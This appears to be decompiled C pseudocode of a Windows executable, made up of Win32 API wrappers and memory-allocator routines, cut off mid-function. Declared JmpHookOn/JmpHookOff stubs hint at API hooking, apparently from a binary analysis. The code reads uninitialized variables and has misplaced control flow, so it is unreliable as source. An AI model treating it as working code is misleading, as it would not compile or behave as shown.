int32_t function_407e93(void);
int32_t function_407e98(void);
int32_t function_407f1e(int32_t a1);
int32_t JmpHookOff(void);
int32_t JmpHookOn(void);
int32_t unknown_4e42(void);
int32_t unknown_4f1a(void);

// --------------------- Global Variables ---------------------

int32_t g1 = 37; // 0x404c76
int32_t g2 = 62; // 0x405aae
int32_t g3 = 46; // 0x405b12
int32_t g4 = 41; // 0x406332
int32_t g5 = 47; // 0x406612
int32_t g6 = 47; // 0x406c56
int32_t g7 = 0x6f485408; // 0x407656
int32_t g8 = 0; // 0x408000
int32_t g9 = 0; // 0x408004
int32_t g10 = 0; // 0x408008
int32_t g11 = 0x408d02; // 0x40800c
int32_t g12 = 0; // 0x408010
int32_t g13 = 0; // 0x408014
char * g14 = "2\x13\x8b\xc0"; // 0x408018
char g15 = 0; // 0x40801c
char g16 = 0; // 0x408020
char g17 = 0; // 0x408024
int32_t g18 = 0; // 0x408028
int32_t g19 = 0; // 0x40802c
char * g20 = "0123456789ABCDEF\xff\xff\xff\xff"; // 0x408080
int32_t g21 = -1; // 0x408090
int32_t g22 = 0; // 0x408094
int32_t g23 = 0; // 0x408098
int32_t g24 = 0; // 0x40809c
int32_t g25 = 0; // 0x4080a0
char * g26 = "aixiaran\x12H@"; // 0x4080d0
int32_t g27 = 0x408d01; // 0x4080f0
int32_t g28 = 1; // 0x4080f8
int32_t g29 = 0; // 0x408104
int32_t g30 = 0; // 0x408108
int32_t g31 = 0; // 0x40810c
int32_t g32 = 0; // 0x408118
int32_t g33; // 0x40812c
int32_t g34; // 0x408138
int32_t g35; // 0x40813c
int32_t g36; // 0x408140
int32_t g37; // 0x408148
int32_t g38; // 0x408154
int32_t g40 = 0; // 0x409000
int32_t g41 = 0; // 0x40900c
int32_t g42 = 0; // 0x409010
int32_t g43 = 0; // 0x409014
int32_t g44 = 0; // 0x40901c
int32_t g45 = 0; // 0x409020
int32_t g46 = 0; // 0x409024
int32_t g47 = 0; // 0x409028
int32_t g48 = 0; // 0x40902c
int32_t g49 = 0; // 0x409030
char g50 = 0; // 0x409034
char g51 = 0; // 0x409035
int32_t g52 = 0; // 0x409036
int32_t g53 = 0; // 0x409038
int32_t g54 = 0; // 0x40903c
int16_t g55 = 0; // 0x409208
int32_t g56 = 0; // 0x4093d4
int32_t g57 = 0; // 0x40959c
int32_t g58 = 0; // 0x4095a0
int32_t g59 = 0; // 0x4095a4
int32_t g60 = 0; // 0x4095a8
char g61 = 0; // 0x4095ac
int32_t g62 = 0; // 0x4095b0
struct _RTL_CRITICAL_SECTION * g63 = NULL; // 0x4095b4
int32_t g64 = 0; // 0x4095cc
int32_t g65 = 0; // 0x4095d0
int32_t g66 = 0; // 0x4095d4
int32_t g67 = 0; // 0x4095e4
int32_t g68 = 0; // 0x4095f4
int32_t g69 = 0; // 0x4095f8
int32_t g70 = 0; // 0x409600
int32_t g71 = 0; // 0x409604
int32_t g72 = 0; // 0x409608
int32_t g73 = 0; // 0x40960c
int32_t g74 = 0; // 0x409610
char * g75; // 0x409620
int32_t g76 = 0; // 0x409624
int32_t g77 = 0; // 0x409628
int32_t g78 = 0; // 0x40962c
int32_t g79 = 0; // 0x409630
char g80 = 0; // 0x409648
char g81 = 0; // 0x40964c
int32_t (*g82)(int32_t, int32_t, int32_t) = NULL; // 0x409650
int32_t g83 = 0; // 0x409654
int32_t g84 = 0; // 0x409658
int32_t g85 = 0; // 0x40965c
int32_t g86 = 0; // 0x409660
int32_t g87 = 0; // 0x409664
int32_t g88 = 0; // 0x409678
int32_t g89 = 0; // 0x40967c
int32_t g90 = 0; // 0x409680
int32_t g91 = 0; // 0x409684
int32_t g92 = 0; // 0x409688
int32_t g93 = 0; // 0x40968c
int32_t g94 = 0; // 0x409690
int32_t g95 = 0; // 0x409694
int32_t g96 = 0; // 0x409698
int32_t g97 = 0; // 0x40969c
int32_t g98 = 0; // 0x4096a0
int32_t g99 = 0; // 0x4096a4
int32_t g100 = 0; // 0x4096a8
int32_t g101 = 0; // 0x4096ac
int32_t g102 = 0; // 0x4096b0
int32_t g103 = 0; // 0x4096b4
int32_t g104 = 0; // 0x4096bc
int32_t g105 = 0; // 0x4096c0
int32_t g106 = 0; // 0x4096c8
int32_t g107 = 0; // 0x4096cc
int32_t g108 = 0; // 0x4096d4
int32_t g109 = 0; // 0x4096d8
int32_t g110 = 0; // 0x4096dc
int32_t g111 = 0; // 0x4096e0
int32_t g112 = 0; // 0x4096e4
int32_t g113 = 0; // 0x4096e8
int32_t g114 = 0; // 0x4096ec
int32_t g115 = 0; // 0x4096f0
int32_t g116 = 0; // 0x4096f4
int32_t g117 = 0; // 0x409808
int32_t g118;
int32_t * g39 = &g27; // 0x408160

// ------------------------ Functions -------------------------

// Address range: 0x40103b - 0x401041
int32_t function_40103b(void) {
    // 0x40103b
    int32_t v1; // 0x40103b
    return v1 & -256;
}

// Address range: 0x401041 - 0x401049
int32_t function_401041(int32_t a1) {
    // 0x401041
    int32_t v1; // 0x401041
    return v1 & -256;
}

// Address range: 0x401049 - 0x401070
int32_t function_401049(int16_t a1) {
    // 0x401049
    int32_t v1; // 0x401049
    char * v2 = (char *)(v1 - 0x45ffbfd6); // 0x401049
    uint32_t v3; // 0x401049
    *v2 = *v2 + (char)(v3 / 256);
    int32_t v4; // 0x401049
    *(int32_t *)v4 = 0;
    int32_t v5 = v4 & -256; // 0x401052
    int32_t * v6 = (int32_t *)v5; // 0x401053
    *v6 = *v6 + -2 * v5;
    int32_t v7; // 0x401049
    __asm_bound(*(int64_t *)(v7 + 101));
    int32_t v8; // 0x401049
    __asm_arpl(*(int16_t *)(9 * v8 + 28), (int16_t)v1);
    RaiseException((int32_t)&g118, (int32_t)&g118, (int32_t)&g118, &g118);
    return &g118;
}

// Address range: 0x401062 - 0x401063
int32_t function_401062(int32_t a1, int32_t a2, int32_t * a3, int32_t a4, char * a5) {
    // 0x401062
    int32_t result; // 0x401062
    return result;
}

// Address range: 0x401072 - 0x401078
void function_401072(int32_t * TargetFrame, int32_t * TargetIp, struct _EXCEPTION_RECORD * ExceptionRecord, int32_t * ReturnValue) {
    // 0x401072
    RtlUnwind(TargetFrame, TargetIp, ExceptionRecord, ReturnValue);
}

// Address range: 0x40107a - 0x401080
int32_t function_40107a(struct _EXCEPTION_POINTERS * ExceptionInfo) {
    // 0x40107a
    return UnhandledExceptionFilter(ExceptionInfo);
}

// Address range: 0x401082 - 0x401088
bool function_401082(int32_t * hFile, int32_t * lpBuffer, int32_t nNumberOfBytesToWrite, int32_t * lpNumberOfBytesWritten, struct _OVERLAPPED * lpOverlapped) {
    // 0x401082
    return WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
}

// Address range: 0x40108a - 0x401090
void function_40108a(int32_t uExitCode) {
    // 0x40108a
    ExitProcess(uExitCode);
}

// Address range: 0x401092 - 0x401098
int32_t function_401092(int32_t * hWnd, char * lpText, char * lpCaption, int32_t uType) {
    // 0x401092
    return MessageBoxA(hWnd, lpText, lpCaption, uType);
}

// Address range: 0x40109a - 0x4010a0
bool function_40109a(int32_t * hLibModule) {
    // 0x40109a
    return FreeLibrary(hLibModule);
}

// Address range: 0x4010a2 - 0x4010a8
char * function_4010a2(void) {
    // 0x4010a2
    return GetCommandLineA();
}

// Address range: 0x4010aa - 0x4010b0
int32_t function_4010aa(int32_t Locale, int32_t LCType, char * lpLCData, int32_t cchData) {
    // 0x4010aa
    return GetLocaleInfoA(Locale, LCType, lpLCData, cchData);
}

// Address range: 0x4010b2 - 0x4010b8
void function_4010b2(struct _STARTUPINFOA * lpStartupInfo) {
    // 0x4010b2
    GetStartupInfoA(lpStartupInfo);
}

// Address range: 0x4010ba - 0x4010c0
int32_t function_4010ba(void) {
    // 0x4010ba
    return GetThreadLocale();
}

// Address range: 0x4010c2 - 0x4010c8
int32_t function_4010c2(int32_t * hKey) {
    // 0x4010c2
    return RegCloseKey(hKey);
}

// Address range: 0x4010ca - 0x4010d0
int32_t function_4010ca(int32_t * hKey, char * lpSubKey, int32_t ulOptions, int32_t samDesired, int32_t ** phkResult) {
    // 0x4010ca
    return RegOpenKeyExA(hKey, lpSubKey, ulOptions, samDesired, phkResult);
}

// Address range: 0x4010d2 - 0x4010d8
int32_t function_4010d2(int32_t * hKey, char * lpValueName, int32_t * lpReserved, int32_t * lpType, char * lpData, int32_t * lpcbData) {
    // 0x4010d2
    return RegQueryValueExA(hKey, lpValueName, lpReserved, lpType, lpData, lpcbData);
}

// Address range: 0x4010da - 0x4010e0
int32_t function_4010da(int16_t ** pbstr, int16_t * psz, int32_t len) {
    // 0x4010da
    return SysReAllocStringLen(pbstr, psz, len);
}

// Address range: 0x4010e2 - 0x4010e8
void function_4010e2(int16_t * bstrString) {
    // 0x4010e2
    SysFreeString(bstrString);
}

// Address range: 0x4010ea - 0x4010f0
int32_t function_4010ea(void) {
    // 0x4010ea
    return GetCurrentThreadId();
}

// Address range: 0x4010f2 - 0x4010f8
int32_t function_4010f2(void) {
    // 0x4010f2
    return GetVersion();
}

// Address range: 0x4010fa - 0x401100
bool function_4010fa(struct _LARGE_INTEGER * lpPerformanceCount) {
    // 0x4010fa
    return QueryPerformanceCounter(lpPerformanceCount);
}

// Address range: 0x401102 - 0x401108
int32_t function_401102(void) {
    // 0x401102
    return GetTickCount();
}

// Address range: 0x40110a - 0x40112c
int32_t function_40110a(void) {
    // 0x40110a
    int32_t lpStartupInfo; // 0x40110a
    GetStartupInfoA((struct _STARTUPINFOA *)lpStartupInfo);
    uint16_t v1; // 0x40110a
    char v2; // 0x40110a
    return (v2 & 1) == 0 ? 10 : (int32_t)v1;
}

// Address range: 0x40112e - 0x401134
int32_t * function_40112e(int32_t uFlags, int32_t uBytes) {
    // 0x40112e
    return LocalAlloc(uFlags, uBytes);
}

// Address range: 0x401136 - 0x40113c
int32_t * function_401136(int32_t * hMem) {
    // 0x401136
    return LocalFree(hMem);
}

// Address range: 0x40113e - 0x401144
int32_t * function_40113e(int32_t * lpAddress, int32_t dwSize, int32_t flAllocationType, int32_t flProtect) {
    // 0x40113e
    return VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
}

// Address range: 0x401146 - 0x40114c
bool function_401146(int32_t * lpAddress, int32_t dwSize, int32_t dwFreeType) {
    // 0x401146
    return VirtualFree(lpAddress, dwSize, dwFreeType);
}

// Address range: 0x40114e - 0x401154
void function_40114e(struct _RTL_CRITICAL_SECTION * lpCriticalSection) {
    // 0x40114e
    InitializeCriticalSection(lpCriticalSection);
}

// Address range: 0x401156 - 0x40115c
void function_401156(struct _RTL_CRITICAL_SECTION * lpCriticalSection) {
    // 0x401156
    EnterCriticalSection(lpCriticalSection);
}

// Address range: 0x40115e - 0x401164
void function_40115e(struct _RTL_CRITICAL_SECTION * lpCriticalSection) {
    // 0x40115e
    LeaveCriticalSection(lpCriticalSection);
}

// Address range: 0x401166 - 0x40116c
void function_401166(struct _RTL_CRITICAL_SECTION * lpCriticalSection) {
    // 0x401166
    DeleteCriticalSection(lpCriticalSection);
}

// Address range: 0x40116e - 0x4011bd
int32_t function_40116e(int32_t a1, int32_t a2) {
    int32_t result = g65; // 0x401175
    if (result != 0) {
        // 0x4011b4
        g65 = *(int32_t *)result;
        return result;
    }
    // 0x40117a
    int32_t uBytes; // 0x40116e
    int32_t uFlags; // 0x40116e
    int32_t * memoryHandle = LocalAlloc(uFlags, uBytes); // 0x401181
    if (memoryHandle == NULL) {
        // 0x40118c
        return 0;
    }
    int32_t v1 = (int32_t)memoryHandle; // 0x401181
    *memoryHandle = g64;
    g64 = v1;
    int32_t v2 = 0; // 0x40119e
    int32_t result2 = v1 + 4 + 16 * v2; // 0x4011a4
    int32_t * v3 = (int32_t *)result2;
    *v3 = g65;
    g65 = result2;
    v2++;
    while (v2 != 100) {
        int32_t v4 = result2; // 0x4011a8
        result2 = v1 + 4 + 16 * v2;
        v3 = (int32_t *)result2;
        *v3 = v4;
        g65 = result2;
        v2++;
    }
    // 0x4011b4
    g65 = *v3;
    return result2;
}

// Address range: 0x4011be - 0x4011c4
int32_t function_4011be(void) {
    // 0x4011be
    int32_t result; // 0x4011be
    return result;
}

// Address range: 0x4011c6 - 0x4011f6
int32_t function_4011c6(void) {
    // 0x4011c6
    int32_t v1; // 0x4011c6
    int32_t v2; // 0x4011c6
    int32_t v3 = function_40116e(v2, v1); // 0x4011cc
    if (v3 == 0) {
        // 0x4011d5
        return 0;
    }
    // 0x4011da
    int32_t v4; // 0x4011c6
    *(int32_t *)(v3 + 12) = *(int32_t *)(v4 + 4);
    *(int32_t *)v3 = v3;
    *(int32_t *)(v3 + 4) = v3;
    int32_t v5; // 0x4011c6
    *(int32_t *)v5 = v3;
    return v3 & -256 | 1;
}

// Address range: 0x4011f6 - 0x40120e
int32_t function_4011f6(void) {
    // 0x4011f6
    int32_t result; // 0x4011f6
    int32_t * v1 = (int32_t *)(result + 4); // 0x4011f6
    *(int32_t *)result = g65;
    return result;
}

// Address range: 0x40120e - 0x40127e
int32_t function_40120e(void) {
    // 0x40120e
    int32_t v1; // 0x40120e
    int32_t * v2 = (int32_t *)v1; // 0x401222
    int32_t v3; // 0x40120e
    int32_t v4 = *(int32_t *)(v3 + 4); // 0x401224
    int32_t * v5 = (int32_t *)(v1 + 4); // 0x401227
    *v5 = v4;
    int32_t v6; // 0x40120e
    int32_t v7 = *(int32_t *)v6; // 0x40122a
    int32_t * v8 = (int32_t *)(v6 + 8); // 0x40122e
    int32_t v9 = *v8; // 0x40122e
    int32_t * v10 = (int32_t *)(v6 + 12); // 0x401231
    int32_t v11; // 0x40120e
    int32_t v12; // 0x401247
    int32_t v13; // 0x40125e
    if (v1 != *v10 + v9) {
        // 0x40124c
        v11 = v4;
        if (v4 + v1 == v9) {
            // 0x401254
            function_4011f6();
            v13 = *v5 + *v10;
            *v5 = v13;
            v11 = v13;
        }
    } else {
        // 0x401238
        function_4011f6();
        *v2 = *v8;
        v12 = *v5 + *v10;
        *v5 = v12;
        v11 = v12;
    }
    int32_t v14 = v11; // 0x401265
    v6 = v7;
    int32_t v15; // 0x40120e
    while (v15 != v7) {
        // 0x40122a
        v7 = *(int32_t *)v6;
        v8 = (int32_t *)(v6 + 8);
        v9 = *v8;
        v10 = (int32_t *)(v6 + 12);
        if (v1 != *v10 + v9) {
            // 0x40124c
            v11 = v14;
            if (v14 + v1 == v9) {
                // 0x401254
                function_4011f6();
                v13 = *v5 + *v10;
                *v5 = v13;
                v11 = v13;
            }
        } else {
            // 0x401238
            function_4011f6();
            *v2 = *v8;
            v12 = *v5 + *v10;
            *v5 = v12;
            v11 = v12;
        }
        // 0x401261
        v14 = v11;
        v6 = v7;
    }
    int32_t v16 = function_4011c6(); // 0x40126b
    int32_t result = v16; // 0x401272
    if ((char)v16 == 0) {
        // 0x401274
        *v2 = 0;
        result = 0;
    }
    // 0x401278
    return result;
}

// Address range: 0x40127e - 0x401311
int32_t function_40127e(void) {
    // 0x40127e
    uint32_t v1; // 0x40127e
    int32_t * v2 = (int32_t *)(v1 + 4);
    int32_t v3; // 0x40127e
    int32_t * v4 = (int32_t *)(v3 + 8);
    uint32_t v5 = *v4; // 0x40128b
    int32_t result; // 0x40127e
    int32_t v6; // 0x401299
    uint32_t v7; // 0x401299
    int32_t v8; // 0x4012aa
    int32_t v9; // 0x4012ad
    int32_t v10; // 0x4012f1
    int32_t v11; // 0x401294
    uint32_t v12; // 0x401294
    int32_t * v13; // 0x40127e
    if (v1 >= v5) {
        // 0x401292
        v11 = *v2;
        v12 = v11 + v1;
        v13 = (int32_t *)(v3 + 12);
        v6 = *v13;
        v7 = v6 + v5;
        if (v12 <= v7) {
            if (v1 != v5) {
                if (v12 != v7) {
                    // 0x4012d4
                    *v13 = v1 - v5;
                    v10 = function_4011c6();
                    result = 0;
                    if ((char)v10 != 0) {
                        // 0x4012fe
                        result = v10 & -256 | 1;
                        return result;
                    } else {
                        return result;
                    }
                } else {
                    // 0x4012cf
                    *v13 = v6 - v11;
                    // 0x4012fe
                    result = v5 & -256 | 1;
                    return result;
                }
            } else {
                // 0x4012a4
                *v4 = v11 + v5;
                v8 = *v2;
                v9 = *v13 - v8;
                *v13 = v9;
                if (v9 != 0) {
                    // 0x4012fe
                    result = v8 & -256 | 1;
                    return result;
                } else {
                    // 0x4012fe
                    result = function_4011f6() & -256 | 1;
                    return result;
                }
            }
        }
    }
    int32_t v14 = *(int32_t *)v3; // 0x401302
    result = 0;
    int32_t v15; // 0x40127e
    while (v15 != v14) {
        int32_t v16 = v14;
        v4 = (int32_t *)(v16 + 8);
        v5 = *v4;
        if (v1 >= v5) {
            // 0x401292
            v11 = *v2;
            v12 = v11 + v1;
            v13 = (int32_t *)(v16 + 12);
            v6 = *v13;
            v7 = v6 + v5;
            if (v12 <= v7) {
                if (v1 != v5) {
                    if (v12 != v7) {
                        // 0x4012d4
                        *v13 = v1 - v5;
                        v10 = function_4011c6();
                        result = 0;
                        if ((char)v10 != 0) {
                            // 0x4012fe
                            result = v10 & -256 | 1;
                            return result;
                        } else {
                            return result;
                        }
                    } else {
                        // 0x4012cf
                        *v13 = v6 - v11;
                        // 0x4012fe
                        result = v5 & -256 | 1;
                        return result;
                    }
                } else {
                    // 0x4012a4
                    *v4 = v11 + v5;
                    v8 = *v2;
                    v9 = *v13 - v8;
                    *v13 = v9;
                    if (v9 != 0) {
                        // 0x4012fe
                        result = v8 & -256 | 1;
                        return result;
                    } else {
                        // 0x4012fe
                        result = function_4011f6() & -256 | 1;
                        return result;
                    }
                }
            }
        }
        // 0x401302
        v14 = *(int32_t *)v16;
        result = 0;
    }
  lab_0x40130a:
    // 0x40130a
    return result;
}

// Address range: 0x401312 - 0x401375
int32_t function_401312(void) {
    // 0x401312
    int32_t dwFreeType; // 0x401312
    int32_t v1; // 0x401312
    *(int32_t *)(dwFreeType + 4) = v1 > 0xfffff ? v1 + 0xffff & -0x10000 : 0x100000;
    int32_t flAllocationType; // 0x401312
    int32_t dwSize; // 0x401312
    int32_t lpAddress; // 0x401312
    int32_t * memory = VirtualAlloc((int32_t *)lpAddress, dwSize, flAllocationType, 1); // 0x401341
    int32_t result = (int32_t)memory; // 0x401341
    int32_t * v2 = (int32_t *)dwFreeType; // 0x401348
    *v2 = result;
    if (memory == NULL) {
        // 0x401371
        return result;
    }
    int32_t v3 = function_4011c6(); // 0x401355
    int32_t result2 = v3; // 0x40135c
    if ((char)v3 == 0) {
        // 0x40135e
        VirtualFree((int32_t *)0x8000, 0, dwFreeType);
        *v2 = 0;
        result2 = 0;
    }
    // 0x401371
    return result2;
}

// Address range: 0x401376 - 0x4013ed
int32_t function_401376(void) {
    // 0x401376
    int32_t v1; // 0x401376
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x401380
    *v2 = 0x100000;
    int32_t flAllocationType; // 0x401376
    int32_t dwSize; // 0x401376
    int32_t flProtect; // 0x401376
    int32_t lpAddress; // 0x401376
    int32_t * memory = VirtualAlloc((int32_t *)lpAddress, dwSize, flAllocationType, flProtect); // 0x401394
    int32_t v3 = (int32_t)memory; // 0x401394
    int32_t * v4 = (int32_t *)v1; // 0x40139b
    *v4 = v3;
    int32_t memory2 = v3; // 0x40139f
    int32_t v5; // bp-32, 0x401376
    int32_t * v6 = &v5; // 0x40139f
    if (memory == NULL) {
        // 0x4013a1
        int32_t v7; // 0x401376
        int32_t flAllocationType2 = v7 + 0xffff & -0x10000; // 0x4013a7
        *v2 = flAllocationType2;
        int32_t flProtect2; // 0x401376
        memory2 = (int32_t)VirtualAlloc((int32_t *)4, 0x2000, flAllocationType2, flProtect2);
        *v4 = memory2;
        int32_t v8; // bp-48, 0x401376
        v6 = &v8;
    }
    // 0x4013c0
    if (v1 == 0) {
        // 0x4013e8
        return memory2;
    }
    int32_t v9 = function_4011c6(); // 0x4013cc
    int32_t result = v9; // 0x4013d3
    if ((char)v9 == 0) {
        int32_t v10 = (int32_t)v6;
        *(int32_t *)(v10 - 4) = 0x8000;
        *(int32_t *)(v10 - 8) = 0;
        VirtualFree(&g118, (int32_t)&g118, (int32_t)&g118);
        *v4 = 0;
        result = 0;
    }
    // 0x4013e8
    return result;
}

// Address range: 0x4013ee - 0x4014a6
int32_t function_4013ee(void) {
    // 0x4013ee
    int32_t v1; // bp-36, 0x4013ee
    int32_t v2 = &v1; // 0x4013f2
    int32_t v3 = v2; // 0x401474
    if (g66 != (int32_t)&g66) {
        int32_t v4 = *(int32_t *)g66; // 0x40141d
        uint32_t v5 = *(int32_t *)(g66 + 8); // 0x40141f
        int32_t v6 = v2; // 0x401424
        int32_t v7; // 0x4013ee
        uint32_t v8; // 0x4013ee
        uint32_t v9; // 0x4013ee
        int32_t * v10; // 0x401428
        int32_t v11; // 0x4013ee
        int32_t * v12; // 0x401431
        int32_t * v13; // 0x401440
        int32_t v14; // 0x401451
        if (v9 <= v5) {
            // 0x401426
            v10 = (int32_t *)(g66 + 12);
            v11 = *v10 + v5;
            v6 = v2;
            if (v11 <= *(int32_t *)(v2 + 16)) {
                // 0x401431
                v12 = (int32_t *)(v2 + 8);
                v7 = v11;
                if (v5 < *v12) {
                    // 0x401437
                    *v12 = v5;
                    v7 = *v10 + v5;
                }
                // 0x40143b
                v8 = v7;
                v13 = (int32_t *)(v2 + 12);
                if (v8 > *v13) {
                    // 0x401446
                    *v13 = v8;
                }
                // 0x40144a
                *(int32_t *)(v2 - 4) = 0x8000;
                *(int32_t *)(v2 - 8) = 0;
                v14 = v2 - 12;
                *(int32_t *)v14 = v5;
                if (!VirtualFree(&g118, (int32_t)&g118, (int32_t)&g118)) {
                    // 0x40145b
                    g62 = 1;
                }
                // 0x401465
                function_4011f6();
                v6 = v14;
            }
        }
        int32_t v15 = v6;
        v3 = v15;
        while (v4 != (int32_t)&g66) {
            int32_t v16 = v15;
            int32_t v17 = v4;
            v4 = *(int32_t *)v17;
            v5 = *(int32_t *)(v17 + 8);
            v6 = v16;
            if (v9 <= v5) {
                // 0x401426
                v10 = (int32_t *)(v17 + 12);
                v11 = *v10 + v5;
                v6 = v16;
                if (v11 <= *(int32_t *)(v16 + 16)) {
                    // 0x401431
                    v12 = (int32_t *)(v16 + 8);
                    v7 = v11;
                    if (v5 < *v12) {
                        // 0x401437
                        *v12 = v5;
                        v7 = *v10 + v5;
                    }
                    // 0x40143b
                    v8 = v7;
                    v13 = (int32_t *)(v16 + 12);
                    if (v8 > *v13) {
                        // 0x401446
                        *v13 = v8;
                    }
                    // 0x40144a
                    *(int32_t *)(v16 - 4) = 0x8000;
                    *(int32_t *)(v16 - 8) = 0;
                    v14 = v16 - 12;
                    *(int32_t *)v14 = v5;
                    if (!VirtualFree(&g118, (int32_t)&g118, (int32_t)&g118)) {
                        // 0x40145b
                        g62 = 1;
                    }
                    // 0x401465
                    function_4011f6();
                    v6 = v14;
                }
            }
            // 0x40146c
            v15 = v6;
            v3 = v15;
        }
    }
    int32_t * v18 = (int32_t *)(v3 + 4); // 0x401476
    int32_t v19 = *v18; // 0x401476
    *(int32_t *)v19 = 0;
    int32_t * v20 = (int32_t *)(v3 + 12); // 0x40147e
    int32_t result = v19; // 0x401483
    if (*v20 != 0) {
        int32_t * v21 = (int32_t *)(v3 + 8); // 0x401489
        *(int32_t *)*v18 = *v21;
        result = *v20 - *v21;
        *(int32_t *)(*v18 + 4) = result;
    }
    // 0x40149e
    return result;
}

// Address range: 0x4014a6 - 0x401538
int32_t function_4014a6(void) {
    // 0x4014a6
    int32_t v1; // 0x4014a6
    uint32_t v2 = v1 & -0x1000; // 0x4014b8
    int32_t v3; // 0x4014a6
    *(int32_t *)v3 = v2;
    int32_t v4; // 0x4014a6
    int32_t result = (v4 + 4095 + v1 & -0x1000) - v2; // 0x4014db
    *(int32_t *)(v3 + 4) = result;
    if (g66 == (int32_t)&g66) {
        // 0x401530
        return result;
    }
    int32_t v5 = g66;
    int32_t v6; // bp-28, 0x4014a6
    int32_t v7 = &v6;
    uint32_t v8 = *(int32_t *)(v5 + 8); // 0x4014ec
    uint32_t v9 = *(int32_t *)(v5 + 12) + v8; // 0x4014f2
    uint32_t v10 = v2 > v8 ? v2 : v8;
    uint32_t v11 = *(int32_t *)(v7 + 8); // 0x4014fa
    uint32_t v12 = v9 > v11 ? v11 : v9;
    int32_t v13 = result; // 0x401506
    int32_t v14 = v7; // 0x401506
    int32_t * memory; // 0x401513
    if (v12 > v10) {
        // 0x401508
        *(int32_t *)(v7 - 4) = 4;
        *(int32_t *)(v7 - 8) = 0x1000;
        *(int32_t *)(v7 - 12) = v12 - v10;
        v14 = v7 - 16;
        *(int32_t *)v14 = v10;
        memory = VirtualAlloc(&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118);
        v13 = (int32_t)memory;
        if (memory == NULL) {
            // break -> 0x40151c
            break;
        }
    }
    int32_t v15 = v13;
    v5 = *(int32_t *)v5;
    int32_t result2 = v15; // 0x40152e
    while (v5 != (int32_t)&g66) {
        // 0x4014ec
        v7 = v14;
        v8 = *(int32_t *)(v5 + 8);
        v9 = *(int32_t *)(v5 + 12) + v8;
        v10 = v2 > v8 ? v2 : v8;
        v11 = *(int32_t *)(v7 + 8);
        v12 = v9 > v11 ? v11 : v9;
        v13 = v15;
        v14 = v7;
        if (v12 > v10) {
            // 0x401508
            *(int32_t *)(v7 - 4) = 4;
            *(int32_t *)(v7 - 8) = 0x1000;
            *(int32_t *)(v7 - 12) = v12 - v10;
            v14 = v7 - 16;
            *(int32_t *)v14 = v10;
            memory = VirtualAlloc(&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118);
            v13 = (int32_t)memory;
            if (memory == NULL) {
                // break -> 0x40151c
                break;
            }
        }
        // 0x401526
        v15 = v13;
        v5 = *(int32_t *)v5;
        result2 = v15;
    }
    // 0x401530
    return result2;
}

// Address range: 0x40153a - 0x4015b7
int32_t function_40153a(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40153a
    int32_t v1; // 0x40153a
    int32_t v2 = v1 + 4095 & -0x1000; // 0x401549
    int32_t v3 = v2; // bp-20, 0x40154f
    int32_t v4; // 0x40153a
    uint32_t v5 = v1 + v4 & -0x1000; // 0x401556
    int32_t v6; // 0x40153a
    *(int32_t *)v6 = v2;
    int32_t result = v5 - v3; // 0x401563
    *(int32_t *)(v6 + 4) = result;
    if (g66 == (int32_t)&g66) {
        // 0x4015b1
        return result;
    }
    int32_t v7 = g66;
    int32_t v8 = &v3;
    uint32_t v9 = *(int32_t *)(v7 + 8); // 0x401571
    uint32_t v10 = *(int32_t *)(v7 + 12) + v9; // 0x401577
    uint32_t v11 = *(int32_t *)v8; // 0x401579
    uint32_t v12 = v9 >= v11 ? v9 : v11;
    uint32_t v13 = v5 >= v10 ? v10 : v5;
    int32_t v14 = result; // 0x401589
    int32_t v15 = v8; // 0x401589
    int32_t v16; // 0x401593
    bool v17; // 0x401594
    int32_t v18; // 0x401594
    if (v13 > v12) {
        // 0x40158b
        *(int32_t *)(v8 - 4) = 0x4000;
        *(int32_t *)(v8 - 8) = v13 - v12;
        v16 = v8 - 12;
        *(int32_t *)v16 = v12;
        v17 = VirtualFree(&g118, (int32_t)&g118, (int32_t)&g118);
        v18 = v17;
        v14 = v18;
        v15 = v16;
        if (!v17) {
            // 0x40159d
            g62 = 2;
            v14 = v18;
            v15 = v16;
        }
    }
    int32_t result2 = v14;
    v7 = *(int32_t *)v7;
    while (v7 != (int32_t)&g66) {
        // 0x401571
        v8 = v15;
        v9 = *(int32_t *)(v7 + 8);
        v10 = *(int32_t *)(v7 + 12) + v9;
        v11 = *(int32_t *)v8;
        v12 = v9 >= v11 ? v9 : v11;
        v13 = v5 >= v10 ? v10 : v5;
        v14 = result2;
        v15 = v8;
        if (v13 > v12) {
            // 0x40158b
            *(int32_t *)(v8 - 4) = 0x4000;
            *(int32_t *)(v8 - 8) = v13 - v12;
            v16 = v8 - 12;
            *(int32_t *)v16 = v12;
            v17 = VirtualFree(&g118, (int32_t)&g118, (int32_t)&g118);
            v18 = v17;
            v14 = v18;
            v15 = v16;
            if (!v17) {
                // 0x40159d
                g62 = 2;
                v14 = v18;
                v15 = v16;
            }
        }
        // 0x4015a7
        result2 = v14;
        v7 = *(int32_t *)v7;
    }
    // 0x4015b1
    return result2;
}

// Address range: 0x4015ba - 0x401648
int32_t function_4015ba(int32_t a1) {
    // 0x4015ba
    int32_t v1; // 0x4015ba
    uint32_t v2 = v1 + 0x3fff & -0x4000; // 0x4015d0
    int32_t v3; // 0x4015ba
    int32_t v4; // 0x4015ba
    int32_t * v5; // 0x4015ba
    if (g67 != (int32_t)&g67) {
        v4 = g67;
        v5 = (int32_t *)(v4 + 12);
        if (v2 <= *v5) {
            // break (via goto) -> 0x4015e0
            goto lab_0x4015e0;
        }
        // 0x40160c
        v3 = *(int32_t *)v4;
        while (v3 != (int32_t)&g67) {
            // 0x4015db
            v4 = v3;
            v5 = (int32_t *)(v4 + 12);
            if (v2 <= *v5) {
                // break (via goto) -> 0x4015e0
                goto lab_0x4015e0;
            }
            // 0x40160c
            v3 = *(int32_t *)v4;
        }
    }
    int32_t result = function_401312(); // 0x40161e
    int32_t v6; // 0x4015ba
    while (v6 != 0) {
        // 0x401620
        function_40120e();
        int32_t v7; // 0x4015ba
        if (v7 == 0) {
            // 0x401631
            function_4013ee();
            *(int32_t *)v6 = 0;
            result = 0;
            return result;
        }
        if (g67 != (int32_t)&g67) {
            v4 = g67;
            v5 = (int32_t *)(v4 + 12);
            if (v2 <= *v5) {
                // break (via goto) -> 0x4015e0
                goto lab_0x4015e0;
            }
            // 0x40160c
            v3 = *(int32_t *)v4;
            while (v3 != (int32_t)&g67) {
                // 0x4015db
                v4 = v3;
                v5 = (int32_t *)(v4 + 12);
